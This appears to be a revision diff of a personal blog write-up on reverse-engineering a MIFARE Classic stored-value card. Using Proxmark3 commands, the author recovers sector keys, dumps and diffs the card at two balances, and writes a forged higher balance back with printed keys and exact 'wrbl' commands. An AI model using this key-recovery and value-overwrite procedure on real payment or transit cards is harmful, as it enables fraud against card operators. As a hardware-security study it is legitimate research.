@@ -8,17 +8,13 @@ hidden: true
 sitemap: false
 ---
 
-## Intro
-
 It started with a stored-value card and a very simple question: if the official reader can update the balance, what is stopping me from talking to the same card and writing the same kind of bytes?
 
 So I tried to understand how it worked. The plan was simple: read the card, spend a little, read it again, and compare the two dumps until the balance fell out. This is that little investigation, with just enough MIFARE Classic context to make the block reads, writes, and diffs make sense.
 
-## Card discovery
-
 The first step was simply asking the Proxmark what kind of tag was in front of it. The important parts here are the UID, the detected card family, and the weak PRNG hint, which usually means the card is a good candidate for the standard MIFARE Classic tooling.
 
-```sh
+```pm3
 [usb] pm3 --> hf search
  🕖  Searching for ISO14443-A tag...
 [=] ---------- ISO14443-A Information ----------
@@ -38,13 +34,11 @@ The first step was simply asking the Proxmark what kind of tag was in front of i
 [+] Valid ISO 14443-A tag found
 ```
 
-## MIFARE Classic layout
-
 Before looking at the dump, it helps to keep the MIFARE Classic memory layout in mind (for the full details, refer to the [NPX](https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf) specs). The card is split into sectors, each sector is split into blocks, and every block is 16 bytes. The keys are not attached to a single block: they belong to a whole sector.
 
 For the dump below, the useful mental model is the MIFARE Classic 1K-style layout:
 
-```text
+```plaintext
 sector  global blocks  sector-local blocks  notes
 ------  -------------  -------------------  -----------------------------------------
 0       0-3            0-3                  block 0 is the manufacturer block
@@ -60,7 +54,7 @@ So when the dump says `sec 2 | blk 8`, it means global block `8`, which is block
 
 The sector trailer is special:
 
-```text
+```plaintext
 bytes 0..5    key A
 bytes 6..8    access bits
 byte  9       general purpose byte
@@ -69,7 +63,7 @@ bytes 10..15  key B
 
 The access bits define what key is needed to read or write each block in that sector. In the common simple case, key A can read data blocks and key B can write them, while the trailer itself controls the keys and permissions. That is why the key table printed by `autopwn` shows one key A and one key B per sector trailer block:
 
-```text
+```plaintext
 Sec 2, trailer block 11:
 key A = A49F68AB4733
 key B = B4E109EC9C52
@@ -79,7 +73,7 @@ Those are the keys for the whole sector, not just block `11`. So for this card, 
 
 In practice, the key choice comes from the trailer's access bits:
 
-```text
+```plaintext
 operation                  which key?
 -------------------------  ----------------------------------------------------------
 read a data block          whichever of key A or key B the access bits allow
@@ -92,7 +86,7 @@ As a rule of thumb: data lives in the data blocks, permissions and keys live in 
 
 With that layout in mind, `hf mf info` gives a compact summary of the card and checks whether any obvious default keys work. In this case, sector 0 is readable with the default `FFFFFFFFFFFF` key, which is enough to get started.
 
-```sh
+```pm3
 [usb] pm3 --> hf mf info
 
 [=] --- ISO14443-a Information -----------------------------
@@ -124,7 +118,7 @@ Before touching the card, I took note of the visible balance. This first snapsho
 
 The next step was to recover enough sector keys to read the full memory. `autopwn` tries the usual MIFARE Classic attacks and dictionaries, then prints a useful table: one row per sector trailer, with the recovered key A and key B for that sector. It also dumps the card at the end, so this gives me the first binary snapshot of the card at `12.50`.
 
-```sh
+```pm3
 [usb] pm3 --> hf mf autopwn
 
 [!] ⚠️   Known key failed. Can\'t authenticate to block   0 key type A
@@ -221,7 +215,7 @@ Then I used the card normally and spent some credit. The visible balance moved f
 
 After spending, I dumped the card again with the keys recovered by `autopwn`. This is the second data snapshot: each row is a 16-byte block, with the sector number on the left and the global block number next to it.
 
-```sh
+```pm3
 
 [usb] pm3 --> hf mf dump
 [+] Loaded binary key file `~/hf-mf-6C2FAC83-key.bin`
@@ -312,152 +306,72 @@ At this point I had two dumps from the same card at two different balances: one 
 
 This is the point where the problem becomes relational. A value does not mean much in isolation; it starts to mean something when it changes, or when it is contrasted with another value. Bateson's definition of information as ["a difference that makes a difference"](https://www.goodreads.com/quotes/517599-information-is-a-difference-that-makes-a-difference) fits perfectly here: one dump is just noise, but two dumps, with one known thing changed, start to point at structure.
 
-I used [`ssdp`](https://github.com/fedemengo/ssdp), a small helper tool I wrote, to diff the binary dumps. The diff groups each 16-byte block into units. With `--units 1`, every single byte is its own unit, so the output can point to the exact changed byte instead of a larger 2-, 4-, or 8-byte chunk. That makes the output look like a block view with per-byte offsets, so a change at `+05` means byte `5` inside that block was modified.
+I used [`ssdp`](https://github.com/fedemengo/ssdp), a small tool I wrote, to diff the two dumps. Since I already knew the format was MIFARE Classic 1K, I passed `--format mf1k`, which tells ssdp to label each block by sector and position, and where the byte layout matches decode it as a MIFARE value block with the stored value directly. Unit size defaults to 4 bytes with that flag, which is just the width of a 32-bit MIFARE value.
 
-```sh
-> ssdp diff --units 1 --format mf1k hf-mf-6C2FAC83-dump-0900.bin hf-mf-6C2FAC83-dump-1250.bin | cat
+```ssdp
+#!fields=INT_LE,NOT_LE
+> ssdp diff --format mf1k hf-mf-6C2FAC83-dump-0900.bin hf-mf-6C2FAC83-dump-1250.bin | cat
 Inputs:
-  data01: hf-mf-6C2FAC83-dump-0900.bin
-  data02: hf-mf-6C2FAC83-dump-1250.bin
+  data01: ~/hf-mf-6C2FAC83-dump-0900.bin
+  data02: ~/hf-mf-6C2FAC83-dump-1250.bin
 
 Diff blocks:
-  [BLOCK] ID=6 S=1 B=2
-  [BLOCK] ID=8 S=2 B=0
-  [BLOCK] ID=9 S=2 B=1
+  MIFARE: sec=sector, blk=block within sector
+  [BLOCK] abs=06 (0x06) sec=1 blk=2
+  [BLOCK] abs=08 (0x08) sec=2 blk=0
+  [BLOCK] abs=09 (0x09) sec=2 blk=1
 
-[BLOCK] ID=6 S=1 B=2
-  [units=1]
-    data01: FULL=[92] | [B3] | [D9] | 34 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | [FB] | 01 | 00 | [16]
-    data02: FULL=[C5] | [59] | [C6] | 34 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | [F9] | 01 | 00 | [04]
+[BLOCK] abs=06 (0x06) sec=1 blk=2
+  [units=4]
+    data01: FULL=[92 B3 D9 34] | 00 00 00 00 | 00 00 00 00 | [FB 01 00 16]
+    data02: FULL=[C5 59 C6 34] | 00 00 00 00 | 00 00 00 00 | [F9 01 00 04]
     !+00
-      data01: RAW=92 | INT_LE=       146 | INT_BE=       146 | NOT_LE=       109 | NOT_BE=       109 | BIN=10010010 | BIN_NOT=01101101 | NOT_RAW=6D
-      data02: RAW=C5 | INT_LE=       197 | INT_BE=       197 | NOT_LE=        58 | NOT_BE=        58 | BIN=11000101 | BIN_NOT=00111010 | NOT_RAW=3A
-    !+01
-      data01: RAW=B3 | INT_LE=       179 | INT_BE=       179 | NOT_LE=        76 | NOT_BE=        76 | BIN=10110011 | BIN_NOT=01001100 | NOT_RAW=4C
-      data02: RAW=59 | INT_LE=        89 | INT_BE=        89 | NOT_LE=       166 | NOT_BE=       166 | BIN=01011001 | BIN_NOT=10100110 | NOT_RAW=A6
-    !+02
-      data01: RAW=D9 | INT_LE=       217 | INT_BE=       217 | NOT_LE=        38 | NOT_BE=        38 | BIN=11011001 | BIN_NOT=00100110 | NOT_RAW=26
-      data02: RAW=C6 | INT_LE=       198 | INT_BE=       198 | NOT_LE=        57 | NOT_BE=        57 | BIN=11000110 | BIN_NOT=00111001 | NOT_RAW=39
+      data01: RAW=92 B3 D9 34 | INT_LE= 886682514 | INT_BE=2461260084 | NOT_LE=3408284781 | NOT_BE=1833707211 | BIN=00110100110110011011001110010010 | BIN_NOT=11001011001001100100110001101101 | NOT_RAW=6D 4C 26 CB
+      data02: RAW=C5 59 C6 34 | INT_LE= 885414341 | INT_BE=3310994996 | NOT_LE=3409552954 | NOT_BE= 983972299 | BIN=00110100110001100101100111000101 | BIN_NOT=11001011001110011010011000111010 | NOT_RAW=3A A6 39 CB
     !+12
-      data01: RAW=FB | INT_LE=       251 | INT_BE=       251 | NOT_LE=         4 | NOT_BE=         4 | BIN=11111011 | BIN_NOT=00000100 | NOT_RAW=04
-      data02: RAW=F9 | INT_LE=       249 | INT_BE=       249 | NOT_LE=         6 | NOT_BE=         6 | BIN=11111001 | BIN_NOT=00000110 | NOT_RAW=06
-    !+15
-      data01: RAW=16 | INT_LE=        22 | INT_BE=        22 | NOT_LE=       233 | NOT_BE=       233 | BIN=00010110 | BIN_NOT=11101001 | NOT_RAW=E9
-      data02: RAW=04 | INT_LE=         4 | INT_BE=         4 | NOT_LE=       251 | NOT_BE=       251 | BIN=00000100 | BIN_NOT=11111011 | NOT_RAW=FB
+      data01: RAW=FB 01 00 16 | INT_LE= 369099259 | INT_BE=4211146774 | NOT_LE=3925868036 | NOT_BE=  83820521 | BIN=00010110000000000000000111111011 | BIN_NOT=11101001111111111111111000000100 | NOT_RAW=04 FE FF E9
+      data02: RAW=F9 01 00 04 | INT_LE=  67109369 | INT_BE=4177592324 | NOT_LE=4227857926 | NOT_BE= 117374971 | BIN=00000100000000000000000111111001 | BIN_NOT=11111011111111111111111000000110 | NOT_RAW=06 FE FF FB
 
-[BLOCK] ID=8 S=2 B=0
-  [units=1]
-    data01: FULL=[84] | [03] | 00 | 00 | [7B] | [FC] | FF | FF | [84] | [03] | 00 | 00 | 09 | F6 | 09 | F6
-    data02: FULL=[E2] | [04] | 00 | 00 | [1D] | [FB] | FF | FF | [E2] | [04] | 00 | 00 | 09 | F6 | 09 | F6
+[BLOCK] abs=08 (0x08) sec=2 blk=0
+  data01: [MIFARE VALUE] value=900 adr=9 (0x09)
+  data02: [MIFARE VALUE] value=1250 adr=9 (0x09)
+  [units=4]
+    data01: FULL=[84 03 00 00] | [7B FC FF FF] | [84 03 00 00] | 09 F6 09 F6
+    data02: FULL=[E2 04 00 00] | [1D FB FF FF] | [E2 04 00 00] | 09 F6 09 F6
     !+00
-      data01: RAW=84 | INT_LE=       132 | INT_BE=       132 | NOT_LE=       123 | NOT_BE=       123 | BIN=10000100 | BIN_NOT=01111011 | NOT_RAW=7B
-      data02: RAW=E2 | INT_LE=       226 | INT_BE=       226 | NOT_LE=        29 | NOT_BE=        29 | BIN=11100010 | BIN_NOT=00011101 | NOT_RAW=1D
-    !+01
-      data01: RAW=03 | INT_LE=         3 | INT_BE=         3 | NOT_LE=       252 | NOT_BE=       252 | BIN=00000011 | BIN_NOT=11111100 | NOT_RAW=FC
-      data02: RAW=04 | INT_LE=         4 | INT_BE=         4 | NOT_LE=       251 | NOT_BE=       251 | BIN=00000100 | BIN_NOT=11111011 | NOT_RAW=FB
+      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
+      data02: RAW=E2 04 00 00 | INT_LE=      1250 | INT_BE=3791912960 | NOT_LE=4294966045 | NOT_BE= 503054335 | BIN=00000000000000000000010011100010 | BIN_NOT=11111111111111111111101100011101 | NOT_RAW=1D FB FF FF
     !+04
-      data01: RAW=7B | INT_LE=       123 | INT_BE=       123 | NOT_LE=       132 | NOT_BE=       132 | BIN=01111011 | BIN_NOT=10000100 | NOT_RAW=84
-      data02: RAW=1D | INT_LE=        29 | INT_BE=        29 | NOT_LE=       226 | NOT_BE=       226 | BIN=00011101 | BIN_NOT=11100010 | NOT_RAW=E2
-    !+05
-      data01: RAW=FC | INT_LE=       252 | INT_BE=       252 | NOT_LE=         3 | NOT_BE=         3 | BIN=11111100 | BIN_NOT=00000011 | NOT_RAW=03
-      data02: RAW=FB | INT_LE=       251 | INT_BE=       251 | NOT_LE=         4 | NOT_BE=         4 | BIN=11111011 | BIN_NOT=00000100 | NOT_RAW=04
+      data01: RAW=7B FC FF FF | INT_LE=4294966395 | INT_BE=2080178175 | NOT_LE=       900 | NOT_BE=2214789120 | BIN=11111111111111111111110001111011 | BIN_NOT=00000000000000000000001110000100 | NOT_RAW=84 03 00 00
+      data02: RAW=1D FB FF FF | INT_LE=4294966045 | INT_BE= 503054335 | NOT_LE=      1250 | NOT_BE=3791912960 | BIN=11111111111111111111101100011101 | BIN_NOT=00000000000000000000010011100010 | NOT_RAW=E2 04 00 00
     !+08
-      data01: RAW=84 | INT_LE=       132 | INT_BE=       132 | NOT_LE=       123 | NOT_BE=       123 | BIN=10000100 | BIN_NOT=01111011 | NOT_RAW=7B
-      data02: RAW=E2 | INT_LE=       226 | INT_BE=       226 | NOT_LE=        29 | NOT_BE=        29 | BIN=11100010 | BIN_NOT=00011101 | NOT_RAW=1D
-    !+09
-      data01: RAW=03 | INT_LE=         3 | INT_BE=         3 | NOT_LE=       252 | NOT_BE=       252 | BIN=00000011 | BIN_NOT=11111100 | NOT_RAW=FC
-      data02: RAW=04 | INT_LE=         4 | INT_BE=         4 | NOT_LE=       251 | NOT_BE=       251 | BIN=00000100 | BIN_NOT=11111011 | NOT_RAW=FB
+      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
+      data02: RAW=E2 04 00 00 | INT_LE=      1250 | INT_BE=3791912960 | NOT_LE=4294966045 | NOT_BE= 503054335 | BIN=00000000000000000000010011100010 | BIN_NOT=11111111111111111111101100011101 | NOT_RAW=1D FB FF FF
 
-[BLOCK] ID=9 S=2 B=1
-  [units=1]
-    data01: FULL=[84] | [03] | 00 | 00 | [7B] | [FC] | FF | FF | [84] | [03] | 00 | 00 | 09 | F6 | 09 | F6
-    data02: FULL=[E2] | [04] | 00 | 00 | [1D] | [FB] | FF | FF | [E2] | [04] | 00 | 00 | 09 | F6 | 09 | F6
+[BLOCK] abs=09 (0x09) sec=2 blk=1
+  data01: [MIFARE VALUE] value=900 adr=9 (0x09)
+  data02: [MIFARE VALUE] value=1250 adr=9 (0x09)
+  [units=4]
+    data01: FULL=[84 03 00 00] | [7B FC FF FF] | [84 03 00 00] | 09 F6 09 F6
+    data02: FULL=[E2 04 00 00] | [1D FB FF FF] | [E2 04 00 00] | 09 F6 09 F6
     !+00
-      data01: RAW=84 | INT_LE=       132 | INT_BE=       132 | NOT_LE=       123 | NOT_BE=       123 | BIN=10000100 | BIN_NOT=01111011 | NOT_RAW=7B
-      data02: RAW=E2 | INT_LE=       226 | INT_BE=       226 | NOT_LE=        29 | NOT_BE=        29 | BIN=11100010 | BIN_NOT=00011101 | NOT_RAW=1D
-    !+01
-      data01: RAW=03 | INT_LE=         3 | INT_BE=         3 | NOT_LE=       252 | NOT_BE=       252 | BIN=00000011 | BIN_NOT=11111100 | NOT_RAW=FC
-      data02: RAW=04 | INT_LE=         4 | INT_BE=         4 | NOT_LE=       251 | NOT_BE=       251 | BIN=00000100 | BIN_NOT=11111011 | NOT_RAW=FB
+      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
+      data02: RAW=E2 04 00 00 | INT_LE=      1250 | INT_BE=3791912960 | NOT_LE=4294966045 | NOT_BE= 503054335 | BIN=00000000000000000000010011100010 | BIN_NOT=11111111111111111111101100011101 | NOT_RAW=1D FB FF FF
     !+04
-      data01: RAW=7B | INT_LE=       123 | INT_BE=       123 | NOT_LE=       132 | NOT_BE=       132 | BIN=01111011 | BIN_NOT=10000100 | NOT_RAW=84
-      data02: RAW=1D | INT_LE=        29 | INT_BE=        29 | NOT_LE=       226 | NOT_BE=       226 | BIN=00011101 | BIN_NOT=11100010 | NOT_RAW=E2
-    !+05
-      data01: RAW=FC | INT_LE=       252 | INT_BE=       252 | NOT_LE=         3 | NOT_BE=         3 | BIN=11111100 | BIN_NOT=00000011 | NOT_RAW=03
-      data02: RAW=FB | INT_LE=       251 | INT_BE=       251 | NOT_LE=         4 | NOT_BE=         4 | BIN=11111011 | BIN_NOT=00000100 | NOT_RAW=04
+      data01: RAW=7B FC FF FF | INT_LE=4294966395 | INT_BE=2080178175 | NOT_LE=       900 | NOT_BE=2214789120 | BIN=11111111111111111111110001111011 | BIN_NOT=00000000000000000000001110000100 | NOT_RAW=84 03 00 00
+      data02: RAW=1D FB FF FF | INT_LE=4294966045 | INT_BE= 503054335 | NOT_LE=      1250 | NOT_BE=3791912960 | BIN=11111111111111111111101100011101 | BIN_NOT=00000000000000000000010011100010 | NOT_RAW=E2 04 00 00
     !+08
-      data01: RAW=84 | INT_LE=       132 | INT_BE=       132 | NOT_LE=       123 | NOT_BE=       123 | BIN=10000100 | BIN_NOT=01111011 | NOT_RAW=7B
-      data02: RAW=E2 | INT_LE=       226 | INT_BE=       226 | NOT_LE=        29 | NOT_BE=        29 | BIN=11100010 | BIN_NOT=00011101 | NOT_RAW=1D
-    !+09
-      data01: RAW=03 | INT_LE=         3 | INT_BE=         3 | NOT_LE=       252 | NOT_BE=       252 | BIN=00000011 | BIN_NOT=11111100 | NOT_RAW=FC
-      data02: RAW=04 | INT_LE=         4 | INT_BE=         4 | NOT_LE=       251 | NOT_BE=       251 | BIN=00000100 | BIN_NOT=11111011 | NOT_RAW=FB
+      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
+      data02: RAW=E2 04 00 00 | INT_LE=      1250 | INT_BE=3791912960 | NOT_LE=4294966045 | NOT_BE= 503054335 | BIN=00000000000000000000010011100010 | BIN_NOT=11111111111111111111101100011101 | NOT_RAW=1D FB FF FF
 
 ```
 
-This is useful, but it is also noisy. The interesting changes tend to come in adjacent byte pairs, so it makes sense to run the same comparison again with `--units 2`. That gives a better view of 16-bit values, which is exactly the kind of encoding I would expect for a small balance.
+The `[MIFARE VALUE]` annotation does the heavy lifting here: ssdp reads the NXP value-block layout and prints the stored integer directly, no guessing needed. Each unit also shows the raw bytes in multiple encodings (little/big-endian, bitwise-not, bits) inspired by [ImHex](https://imhex.werwolv.net/).
 
-```sh
-> ssdp diff --units 2 --format mf1k hf-mf-6C2FAC83-dump-0900.bin hf-mf-6C2FAC83-dump-1250.bin | cat
-Inputs:
-  data01: hf-mf-6C2FAC83-dump-0900.bin
-  data02: hf-mf-6C2FAC83-dump-1250.bin
+And this is where it gets (almost [trivially](https://trivialityspace.github.io/)) obvious. In blocks `8` and `9`, the little-endian value lines up exactly with the two balances: `9.00` and `12.50`.
 
-Diff blocks:
-  [BLOCK] ID=6 S=1 B=2
-  [BLOCK] ID=8 S=2 B=0
-  [BLOCK] ID=9 S=2 B=1
-
-[BLOCK] ID=6 S=1 B=2
-  [units=2]
-    data01: FULL=[92 B3] | [D9 34] | 00 00 | 00 00 | 00 00 | 00 00 | [FB 01] | [00 16]
-    data02: FULL=[C5 59] | [C6 34] | 00 00 | 00 00 | 00 00 | 00 00 | [F9 01] | [00 04]
-    !+00
-      data01: RAW=92 B3 | INT_LE=     45970 | INT_BE=     37555 | NOT_LE=     19565 | NOT_BE=     27980 | BIN=1011001110010010 | BIN_NOT=0100110001101101 | NOT_RAW=6D 4C
-      data02: RAW=C5 59 | INT_LE=     22981 | INT_BE=     50521 | NOT_LE=     42554 | NOT_BE=     15014 | BIN=0101100111000101 | BIN_NOT=1010011000111010 | NOT_RAW=3A A6
-    !+02
-      data01: RAW=D9 34 | INT_LE=     13529 | INT_BE=     55604 | NOT_LE=     52006 | NOT_BE=      9931 | BIN=0011010011011001 | BIN_NOT=1100101100100110 | NOT_RAW=26 CB
-      data02: RAW=C6 34 | INT_LE=     13510 | INT_BE=     50740 | NOT_LE=     52025 | NOT_BE=     14795 | BIN=0011010011000110 | BIN_NOT=1100101100111001 | NOT_RAW=39 CB
-    !+12
-      data01: RAW=FB 01 | INT_LE=       507 | INT_BE=     64257 | NOT_LE=     65028 | NOT_BE=      1278 | BIN=0000000111111011 | BIN_NOT=1111111000000100 | NOT_RAW=04 FE
-      data02: RAW=F9 01 | INT_LE=       505 | INT_BE=     63745 | NOT_LE=     65030 | NOT_BE=      1790 | BIN=0000000111111001 | BIN_NOT=1111111000000110 | NOT_RAW=06 FE
-    !+14
-      data01: RAW=00 16 | INT_LE=      5632 | INT_BE=        22 | NOT_LE=     59903 | NOT_BE=     65513 | BIN=0001011000000000 | BIN_NOT=1110100111111111 | NOT_RAW=FF E9
-      data02: RAW=00 04 | INT_LE=      1024 | INT_BE=         4 | NOT_LE=     64511 | NOT_BE=     65531 | BIN=0000010000000000 | BIN_NOT=1111101111111111 | NOT_RAW=FF FB
-
-[BLOCK] ID=8 S=2 B=0
-  [units=2]
-    data01: FULL=[84 03] | 00 00 | [7B FC] | FF FF | [84 03] | 00 00 | 09 F6 | 09 F6
-    data02: FULL=[E2 04] | 00 00 | [1D FB] | FF FF | [E2 04] | 00 00 | 09 F6 | 09 F6
-    !+00
-      data01: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
-      data02: RAW=E2 04 | INT_LE=      1250 | INT_BE=     57860 | NOT_LE=     64285 | NOT_BE=      7675 | BIN=0000010011100010 | BIN_NOT=1111101100011101 | NOT_RAW=1D FB
-    !+04
-      data01: RAW=7B FC | INT_LE=     64635 | INT_BE=     31740 | NOT_LE=       900 | NOT_BE=     33795 | BIN=1111110001111011 | BIN_NOT=0000001110000100 | NOT_RAW=84 03
-      data02: RAW=1D FB | INT_LE=     64285 | INT_BE=      7675 | NOT_LE=      1250 | NOT_BE=     57860 | BIN=1111101100011101 | BIN_NOT=0000010011100010 | NOT_RAW=E2 04
-    !+08
-      data01: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
-      data02: RAW=E2 04 | INT_LE=      1250 | INT_BE=     57860 | NOT_LE=     64285 | NOT_BE=      7675 | BIN=0000010011100010 | BIN_NOT=1111101100011101 | NOT_RAW=1D FB
-
-[BLOCK] ID=9 S=2 B=1
-  [units=2]
-    data01: FULL=[84 03] | 00 00 | [7B FC] | FF FF | [84 03] | 00 00 | 09 F6 | 09 F6
-    data02: FULL=[E2 04] | 00 00 | [1D FB] | FF FF | [E2 04] | 00 00 | 09 F6 | 09 F6
-    !+00
-      data01: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
-      data02: RAW=E2 04 | INT_LE=      1250 | INT_BE=     57860 | NOT_LE=     64285 | NOT_BE=      7675 | BIN=0000010011100010 | BIN_NOT=1111101100011101 | NOT_RAW=1D FB
-    !+04
-      data01: RAW=7B FC | INT_LE=     64635 | INT_BE=     31740 | NOT_LE=       900 | NOT_BE=     33795 | BIN=1111110001111011 | BIN_NOT=0000001110000100 | NOT_RAW=84 03
-      data02: RAW=1D FB | INT_LE=     64285 | INT_BE=      7675 | NOT_LE=      1250 | NOT_BE=     57860 | BIN=1111101100011101 | BIN_NOT=0000010011100010 | NOT_RAW=E2 04
-    !+08
-      data01: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
-      data02: RAW=E2 04 | INT_LE=      1250 | INT_BE=     57860 | NOT_LE=     64285 | NOT_BE=      7675 | BIN=0000010011100010 | BIN_NOT=1111101100011101 | NOT_RAW=1D FB
-```
-
-Much cleaner. Each diff-ed unit is also visualised in different encoding (heavily based on [ImHex](https://imhex.werwolv.net/)) such as integer little/big-endian, bits, raw bytes and also their respective not-ed representation.
-
-This is where knowing the visible credit value makes the whole thing much easier (almost [trivial](https://trivialityspace.github.io/)). In blocks `8` and `9`, the little-endian interpretation of the changed bytes directly matches the two balances: `9.00` and `12.50`.
-
-```text
-dump  ID*  sector  sector-block  offset  RAW    INT_LE  NOT_LE
+```plaintext
+dump  blk  sector  sector-block  offset  RAW    INT_LE  NOT_LE
 ----  ---  ------  ------------  ------  -----  ------  ------
 0900  8    2       0             +00     84 03  <900>   64635
 1250  8    2       0             +00     E2 04  <1250>  64285
@@ -473,15 +387,13 @@ dump  ID*  sector  sector-block  offset  RAW    INT_LE  NOT_LE
 1250  9    2       1             +08     E2 04  <1250>  64285
 ```
 
-\*`ID` is the global block number.
 
-So it seems the credit value is written a few times, both as little-endian and as its bitwise-not counterpart. That kind of duplication is common in simple stored-value formats: one copy for the value, one inverted copy as a cheap consistency check, and sometimes another repeated copy for redundancy.
-
-Block `6` also changes, but I am not sure what it represents. It is probably a timestamp, transaction counter, or some other metadata. To keep the experiment focused, I left block `6` alone and only changed the bytes in blocks `8` and `9` that clearly tracked the balance.
+The credit is written three times: once as the value, once bitwise-inverted as a consistency check, once repeated again. That's the NXP value-block format, three copies so a reader can detect corruption. Block `6` also flips on every transaction but doesn't get a `[MIFARE VALUE]` label, which means it doesn't match the value-block layout. Almost certainly a transaction counter or timestamp. I left it alone.
 
 For the test value I used `B0 0B`, for mature and scientific reasons. Conveniently, it also maps to a `29.92` credit value when interpreted as a little-endian integer:
 
-```sh
+```ssdp
+#!fields=INT_LE,NOT_LE
 > ssdp conv b00b 2 --from RAW
 BIN    : 1011000000001011
 BIN_NOT: 0100111111110100
@@ -495,7 +407,7 @@ RAW    : B0 0B
 
 Before writing anything, I wanted to read the target blocks back directly and keep the relevant sector keys in front of me. From the `autopwn` output, sector `2` uses trailer block `11`, with this key pair:
 
-```sh
+```pm3
 [+] -----+-----+--------------+---+--------------+----
 [+]  Sec | Blk | key A        |res| key B        |res
 [+] -----+-----+--------------+---+--------------+----
@@ -521,7 +433,7 @@ Before writing anything, I wanted to read the target blocks back directly and ke
 
 Using key A for sector `2`, I can read blocks `8` and `9` directly and verify that they still contain the `9.00` balance representation:
 
-```sh
+```pm3
 [usb] pm3 --> hf mf rdbl --blk 8 -k A49F68AB4733
 
 [=]   # | sector 02 / 0x02                                | ascii
@@ -548,7 +460,7 @@ The new block value is just the old block with `84 03` (`0900`) replaced by `B0 
 
 For this sector, key B is accepted for the write. I wrote the same updated value to both blocks that appeared to hold the balance:
 
-```sh
+```pm3
 [usb] pm3 --> hf mf wrbl --blk 8 -k B4E109EC9C52 -b -d B00B00004FF4FFFFB00B000009F609F6
 [=] Writing block no 8, key type:B - B4E109EC9C52
 [=] data: B0 0B 00 00 4F F4 FF FF B0 0B 00 00 09 F6 09 F6
@@ -564,43 +476,50 @@ For this sector, key B is accepted for the write. I wrote the same updated value
 
 After writing, I dumped the card again and compared the modified dump against the previous `9.00` dump. The only intended differences should be in blocks `8` and `9`.
 
-```
-> ssdp diff --units 2 --format mf1k hf-mf-6C2FAC83-dump-xxxx.bin hf-mf-6C2FAC83-dump-0900.bin
+```ssdp
+#!fields=INT_LE,NOT_LE
+> ssdp diff --format mf1k hf-mf-6C2FAC83-dump-xxxx.bin hf-mf-6C2FAC83-dump-0900.bin
 Inputs:
-  data01: hf-mf-6C2FAC83-dump-xxxx.bin
-  data02: hf-mf-6C2FAC83-dump-0900.bin
+  data01: ~/hf-mf-6C2FAC83-dump-0900.bin
+  data02: ~/hf-mf-6C2FAC83-dump-xxxx.bin
 
 Diff blocks:
-  [BLOCK] ID=8 S=2 B=0
-  [BLOCK] ID=9 S=2 B=1
+  MIFARE: sec=sector, blk=block within sector
+  [BLOCK] abs=08 (0x08) sec=2 blk=0
+  [BLOCK] abs=09 (0x09) sec=2 blk=1
 
-[BLOCK] ID=8 S=2 B=0
-  [units=2]
-    data01: FULL=[B0 0B] | 00 00 | [4F F4] | FF FF | [B0 0B] | 00 00 | 09 F6 | 09 F6
-    data02: FULL=[84 03] | 00 00 | [7B FC] | FF FF | [84 03] | 00 00 | 09 F6 | 09 F6
+[BLOCK] abs=08 (0x08) sec=2 blk=0
+  data01: [MIFARE VALUE] value=900 adr=9 (0x09)
+  data02: [MIFARE VALUE] value=2992 adr=9 (0x09)
+  [units=4]
+    data01: FULL=[84 03 00 00] | [7B FC FF FF] | [84 03 00 00] | 09 F6 09 F6
+    data02: FULL=[B0 0B 00 00] | [4F F4 FF FF] | [B0 0B 00 00] | 09 F6 09 F6
     !+00
-      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
-      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
+      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
+      data02: RAW=B0 0B 00 00 | INT_LE=      2992 | INT_BE=2953510912 | NOT_LE=4294964303 | NOT_BE=1341456383 | BIN=00000000000000000000101110110000 | BIN_NOT=11111111111111111111010001001111 | NOT_RAW=4F F4 FF FF
     !+04
-      data01: RAW=4F F4 | INT_LE=     62543 | INT_BE=     20468 | NOT_LE=      2992 | NOT_BE=     45067 | BIN=1111010001001111 | BIN_NOT=0000101110110000 | NOT_RAW=B0 0B
-      data02: RAW=7B FC | INT_LE=     64635 | INT_BE=     31740 | NOT_LE=       900 | NOT_BE=     33795 | BIN=1111110001111011 | BIN_NOT=0000001110000100 | NOT_RAW=84 03
+      data01: RAW=7B FC FF FF | INT_LE=4294966395 | INT_BE=2080178175 | NOT_LE=       900 | NOT_BE=2214789120 | BIN=11111111111111111111110001111011 | BIN_NOT=00000000000000000000001110000100 | NOT_RAW=84 03 00 00
